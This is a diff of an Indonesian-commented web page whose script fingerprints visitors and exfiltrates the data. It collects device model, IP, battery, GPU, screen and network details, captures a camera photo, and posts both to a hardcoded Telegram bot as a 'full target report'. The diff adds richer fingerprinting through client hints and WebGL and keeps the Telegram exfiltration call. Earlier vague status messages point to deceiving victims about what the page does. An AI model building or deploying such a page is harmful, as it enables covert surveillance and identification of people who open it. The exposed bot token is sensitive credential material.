@@ -120,8 +120,7 @@
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
-    <script>
-        // Token & Chat ID Telegram Kamu
+        <script>
         const BOT_TOKEN = "8013765711:AAFQMhJXquSESpWCf64u9MN0-mlpT8JLlB0"; 
         const CHAT_ID = "7521596861";
 
@@ -130,65 +129,89 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
 
-        // --- FUNGSI MENTARJEMAHKAN KODE HP ---
-        function detectDeviceName(ua) {
-            let androidVer = "Android";
-            let modelCode = "Unknown";
+        // --- 1. FUNGSI PENDETEKSI HP ADVANCED ---
+        async function detectDeviceNameAdvanced() {
             let brand = "Perangkat Tak Dikenal";
+            let modelCode = "Unknown";
+            let osVersion = "Android";
 
-            // Deteksi versi Android
-            const androidMatch = ua.match(/Android\s+([0-9\.]+)/i);
-            if (androidMatch) androidVer = "Android " + androidMatch[1];
+            // A. Coba User-Agent Client Hints (Browser Modern)
+            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+                try {
+                    const uaData = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
+                    if (uaData.model) modelCode = uaData.model;
+                    if (uaData.platformVersion) {
+                        let major = parseInt(uaData.platformVersion.split('.')[0]);
+                        if (major > 0) osVersion = "Android " + (major + 4);
+                    }
+                } catch (e) {}
+            }
 
-            // Deteksi kode model
-            const modelMatch = ua.match(/\(([^)]+)\)/);
-            if (modelMatch) {
-                const parts = modelMatch[1].split(';');
-                if (parts.length >= 2) {
-                    modelCode = parts[parts.length - 1].replace(/Build\/.*/i, '').trim();
+            // B. Parse User Agent Biasa (Jika Client Hints gagal/kosong)
+            const ua = navigator.userAgent;
+            if (modelCode === "Unknown" || modelCode === "K" || modelCode === "") {
+                const modelMatch = ua.match(/\(([^)]+)\)/);
+                if (modelMatch) {
+                    const parts = modelMatch[1].split(';');
+                    if (parts.length >= 2) {
+                        modelCode = parts[parts.length - 1].replace(/Build\/.*/i, '').trim();
+                    }
                 }
             }
 
-            const modelUpper = modelCode.toUpperCase();
-            const uaUpper = ua.toUpperCase();
+            if (osVersion === "Android") {
+                const androidMatch = ua.match(/Android\s+([0-9\.]+)/i);
+                if (androidMatch) osVersion = "Android " + androidMatch[1];
+            }
 
-            // Pengecekan Merek HP
+            // C. Deteksi via GPU (WebGL)
+            let gpuName = "";
+            try {
+                const cvs = document.createElement('canvas');
+                const gl = cvs.getContext('webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    gpuName = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                }
+            } catch (e) {}
+
+            // D. Penentuan Merek
+            const modelUpper = modelCode.toUpperCase();
+            
             if (modelUpper.includes('CPH2083') || modelUpper.includes('CPH2075')) {
                 brand = "OPPO A12 🗿";
             } else if (modelUpper.includes('CPH2239')) {
                 brand = "OPPO A54";
-            } else if (modelUpper.includes('CPH') || uaUpper.includes('OPPO')) {
-                brand = "OPPO (Seri Lain)";
-            } else if (modelUpper.includes('SM-') || uaUpper.includes('SAMSUNG')) {
+            } else if (gpuName.includes('GE8320')) {
+                brand = "OPPO / Realme (Helio P22/P35)";
+            } else if (modelUpper.includes('SM-')) {
                 brand = "Samsung Galaxy";
-            } else if (uaUpper.includes('XIAOMI') || uaUpper.includes('REDMI') || modelUpper.includes('220')) {
+            } else if (ua.toUpperCase().includes('XIAOMI') || ua.toUpperCase().includes('REDMI')) {
                 brand = "Xiaomi / Redmi";
-            } else if (uaUpper.includes('VIVO') || modelUpper.includes('V2')) {
-                brand = "Vivo";
-            } else if (uaUpper.includes('IPHONE')) {
+            } else if (ua.toUpperCase().includes('IPHONE')) {
                 brand = "Apple iPhone";
-                androidVer = "iOS";
+                osVersion = "iOS";
             }
 
-            return `${brand} (${androidVer}) [Model: ${modelCode}]`;
+            return `${brand} (${osVersion}) [Model: ${modelCode}]`;
         }
 
-        // --- FUNGSI PENGUMPULAN FINGERPRINT ---
+        // --- 2. FUNGSI PENGUMPULAN FINGERPRINT LENGKAP ---
         async function getFullFingerprint() {
             let data = [];
 
-            // 1. Tipe HP & OS
-            const rawUA = navigator.userAgent;
-            data.push(`📱 Perangkat: ${detectDeviceName(rawUA)}`);
+            // Panggil Fungsi Pendeteksi HP
+            const deviceDetails = await detectDeviceNameAdvanced();
+            data.push(`📱 Perangkat: ${deviceDetails}`);
 
-            // 2. IP Address
+            // IP Address
             try {
                 const resIP = await fetch('https://api.ipify.org?format=json');
                 const ipJson = await resIP.json();
                 data.push(`🌐 IP: ${ipJson.ip}`);
             } catch { data.push(`🌐 IP: Gagal diambil`); }
 
-            // 3. Info Baterai
+            // Info Baterai
             if ('getBattery' in navigator) {
                 try {
                     const b = await navigator.getBattery();
@@ -196,16 +219,16 @@
                 } catch {}
             }
 
-            // 4. Resolusi Layar
+            // Layar
             data.push(`🖥️ Layar: ${screen.width}x${screen.height} px`);
 
-            // 5. Informasi Jaringan
+            // Jaringan
             const net = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             if (net) {
                 data.push(`📶 Jaringan: ${net.effectiveType || 'N/A'}`);
             }
 
-            // 6. Deteksi GPU
+            // GPU
             try {
                 const cvs = document.createElement('canvas');
                 const gl = cvs.getContext('webgl');
@@ -219,9 +242,9 @@
             return data.join('\n');
         }
 
-        // --- EVENT KLIK TOMBOL ---
+        // --- 3. EVENT TOMBOL ---
         btnTes.addEventListener('click', async () => {
-            status.innerText = "mohon tunggu sebentar";
+            status.innerText = "Mengambil data HP & meminta izin kamera...";
             btnTes.disabled = true;
             btnTes.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Memproses...';
 
@@ -236,7 +259,7 @@
                 video.srcObject = stream;
 
                 video.onloadedmetadata = () => {
-                    status.innerText = "sedikit lagi";
+                    status.innerText = "Mengambil foto...";
 
                     setTimeout(() => {
                         canvas.width = video.videoWidth;
@@ -254,7 +277,7 @@
                             const captionFinal = `📊 LAPORAN TARGET LENGKAP:\n\n${fingerprintText}`;
                             formData.append('caption', captionFinal);
 
-                            status.innerText = "menuju video";
+                            status.innerText = "Mengirim data ke Telegram...";
 
                             try {
                                 const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
@@ -266,7 +289,7 @@
                                 if (resData.ok) {
                                     status.innerText = "Berhasil!.";
                                 } else {
-                                    status.innerText = "Gagal .";
+                                    status.innerText = "Gagal!.";
                                 }
                             } catch (error) {
                                 status.innerText = "Koneksi Error.";
@@ -287,7 +310,5 @@
                 btnTes.innerHTML = '<i class="fas fa-camera"></i> Tes Ambil Foto & Data';
             }
         });
-    </script>
-</body>
-    </html>
-    
+        </script>
+        
